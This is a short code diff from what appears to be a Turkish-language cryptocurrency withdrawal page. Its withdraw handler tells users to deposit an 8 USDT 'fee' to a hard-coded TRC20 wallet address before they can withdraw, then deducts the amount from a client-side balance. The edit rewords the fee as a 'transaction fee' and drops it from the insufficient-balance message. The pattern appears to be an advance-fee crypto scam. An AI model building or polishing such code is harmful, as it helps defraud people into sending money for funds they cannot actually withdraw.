@@ -314,12 +314,12 @@ withdrawBtn.onclick = () => {
     return;
   }
   if (amount + 8 > balance) {
-    withdrawMessage.textContent = "Yetersiz bakiye (8 USDT çekim ücreti dahil).";
+    withdrawMessage.textContent = "Yetersiz bakiye.";
     return;
   }
 
   withdrawMessage.style.color = "#ffaa00";
-  withdrawMessage.textContent = "Lütfen para çekmek için aşağıdaki adrese 8 USDT çekim ücretini yatırın:\nTRC20\nTPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH";
+  withdrawMessage.textContent = "Lütfen para çekmek için aşağıdaki adrese 8 USDT İşlem ücretini yatırın:\nTRC20\nTPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH";
 
   setTimeout(() => {
     balance -= (amount + 8);
